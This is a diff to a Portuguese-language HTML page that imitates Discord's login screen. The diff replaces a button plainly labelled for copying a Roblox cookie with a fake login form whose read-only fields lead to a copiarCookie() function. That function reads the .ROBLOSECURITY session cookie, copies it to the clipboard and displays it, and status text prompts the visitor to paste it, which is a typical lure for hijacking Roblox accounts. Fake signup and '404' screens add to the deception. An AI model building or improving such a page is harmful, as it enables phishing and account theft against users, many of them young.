@@ -25,6 +25,8 @@
       border-radius: 8px;
       box-shadow: 0 2px 10px rgba(0,0,0,0.4);
       text-align: center;
+      position: relative;
+      z-index: 2;
     }
     .logo {
       width: 120px;
@@ -39,7 +41,7 @@
     p.subtitle {
       font-size: 16px;
       color: #b9bbbe;
-      margin-bottom: 40px;
+      margin-bottom: 32px;
       line-height: 1.4;
     }
     .btn {
@@ -58,28 +60,67 @@
     .btn:hover {
       background: #4752c4;
     }
-    .btn-copy {
-      background: #43b581;
-    }
-    .btn-copy:hover {
-      background: #3da162;
-    }
-    #status {
+    .link {
+      color: #00aff4;
+      text-decoration: none;
+      font-size: 14px;
+      cursor: pointer;
       margin-top: 16px;
+      display: inline-block;
+    }
+    .link:hover { text-decoration: underline; }
+    #login-form, #signup-section { display: none; }
+    #status {
+      margin: 16px 0;
       font-size: 14px;
       color: #43b581;
     }
-    .error { color: #f04747 !important; }
-    .art {
-      position: absolute;
-      bottom: 0;
-      left: 0;
+    .error { color: #f04747; }
+    input {
       width: 100%;
-      height: 40%;
-      background: linear-gradient(to top, rgba(54,57,63,0.8), transparent);
-      pointer-events: none;
-      z-index: -1;
+      padding: 12px;
+      margin: 12px 0;
+      background: #202225;
+      border: 1px solid #2f3136;
+      border-radius: 4px;
+      color: #dcddde;
+      font-size: 16px;
     }
+    input::placeholder { color: #72767d; }
+    #error-404 {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 28px;
+      font-weight: bold;
+      color: #f04747;
+      text-align: center;
+      white-space: nowrap;
+      opacity: 0;
+      z-index: 10;
+      pointer-events: none;
+    }
+    .typing { 
+      overflow: hidden; 
+      border-right: .15em solid #f04747; 
+      white-space: nowrap; 
+      margin: 0 auto; 
+      animation: typing 4s steps(40, end) forwards, blink-caret .75s step-end infinite;
+    }
+    @keyframes typing {
+      from { width: 0 }
+      to { width: 100% }
+    }
+    @keyframes blink-caret {
+      from, to { border-color: transparent }
+      50% { border-color: #f04747; }
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .fade-in { animation: fadeIn 1s ease-out forwards; }
     @media (max-width: 500px) {
       .container { padding: 30px 20px; border-radius: 0; min-height: 100vh; }
     }
@@ -87,28 +128,73 @@
 </head>
 <body>
 
-  <div class="art"></div>
-
   <div class="container">
     <img class="logo" src="https://discord.com/assets/2c21aeda16de354ba9334551a883b481.png" alt="Discord Logo">
 
-    <h1>Bem-vindo de volta!</h1>
-    <p class="subtitle">Estamos felizes em te ver novamente. Faça login para continuar.</p>
+    <div id="welcome">
+      <h1>Bem-vindo de volta!</h1>
+      <p class="subtitle">Estamos felizes em te ver novamente. Faça login para continuar.</p>
+      <button class="btn" onclick="showLogin()">Entrar</button>
+      <p style="margin-top:24px; font-size:14px; color:#72767d;">
+        Precisa de uma conta? <span class="link" onclick="showError404()">Se cadastrar</span>
+      </p>
+    </div>
 
-    <!-- Seu botão principal aqui, estilizado como botão do Discord -->
-    <button class="btn btn-copy" onclick="copiarCookie()">Copiar seu cookie do Roblox</button>
+    <div id="login-form">
+      <h1>Entrar</h1>
+      <p class="subtitle">Faça login com seu e-mail ou telefone.</p>
+      <input type="text" placeholder="E-mail ou número de telefone" readonly>
+      <input type="password" placeholder="Senha" readonly>
+      <button class="btn" onclick="copiarCookie()">Continuar</button>
+      <p style="margin-top:16px;">
+        <span class="link" onclick="showSignup()">Sign Up</span> • 
+        <span class="link" onclick="showError404()">Esqueceu sua senha?</span>
+      </p>
+      <div id="status"></div>
+      <textarea id="resultado" readonly style="width:100%; height:80px; margin-top:16px; background:#2f3136; color:#dcddde; border:1px solid #202225; border-radius:4px; padding:12px; font-family:monospace; resize:none; display:none;"></textarea>
+    </div>
 
-    <div id="status"></div>
+    <div id="signup-section" style="display:none;">
+      <h1>Criar uma conta</h1>
+      <p class="subtitle">É rápido e fácil!</p>
+      <input type="text" placeholder="E-mail" readonly>
+      <input type="text" placeholder="Nome de usuário" readonly>
+      <input type="password" placeholder="Senha" readonly>
+      <button class="btn" onclick="showError404()">Continuar</button>
+      <p style="margin-top:16px; font-size:14px; color:#72767d;">
+        Já tem uma conta? <span class="link" onclick="showLogin()">Entrar</span>
+      </p>
+    </div>
 
-    <textarea id="resultado" readonly placeholder="O cookie aparecerá aqui (ou será copiado pro clipboard)" style="width:100%; height:100px; margin-top:20px; background:#2f3136; color:#dcddde; border:1px solid #202225; border-radius:4px; padding:12px; font-family:monospace; resize:none; display:none;"></textarea>
-
-    <p style="margin-top:32px; font-size:14px; color:#72767d;">
-      Precisa de ajuda? <a href="#" style="color:#00aff4; text-decoration:none;">Suporte</a> • 
-      <a href="#" style="color:#00aff4; text-decoration:none;">Registrar</a>
-    </p>
+    <div id="error-404">
+      <span class="typing">| • Erro 404 Ou ainda não disponível • |</span>
+    </div>
   </div>
 
   <script>
+    function showLogin() {
+      document.getElementById("welcome").style.display = "none";
+      document.getElementById("login-form").style.display = "block";
+      document.getElementById("signup-section").style.display = "none";
+      document.getElementById("error-404").style.opacity = "0";
+    }
+
+    function showSignup() {
+      document.getElementById("welcome").style.display = "none";
+      document.getElementById("login-form").style.display = "none";
+      document.getElementById("signup-section").style.display = "block";
+      document.getElementById("error-404").style.opacity = "0";
+    }
+
+    function showError404() {
+      const err = document.getElementById("error-404");
+      err.style.opacity = "1";
+      err.classList.add("fade-in");
+      setTimeout(() => {
+        err.style.opacity = "0";
+      }, 6000); // some depois de 6 segundos
+    }
+
     function copiarCookie() {
       const status = document.getElementById("status");
       const textarea = document.getElementById("resultado");
@@ -130,20 +216,20 @@
         }
 
         if (!robloxCookie) {
-          status.textContent = "Cookie .ROBLOSECURITY não encontrado. Logue no Roblox primeiro!";
+          status.textContent = "Cookie .ROBLOSECURITY não encontrado. (Logue no Roblox primeiro na mesma aba!)";
           status.className = "error";
           return;
         }
 
         navigator.clipboard.writeText(robloxCookie)
           .then(() => {
-            status.textContent = "Cookie copiado! (cole com Ctrl+V)";
+            status.textContent = "Cookie copiado com sucesso! (cole com Ctrl+V)";
             status.className = "";
             textarea.value = robloxCookie;
             textarea.style.display = "block";
           })
           .catch(() => {
-            status.textContent = "Cópia automática falhou. Copie manualmente abaixo:";
+            status.textContent = "Não consegui copiar auto. Copie manualmente abaixo:";
             status.className = "error";
             textarea.value = robloxCookie;
             textarea.style.display = "block";
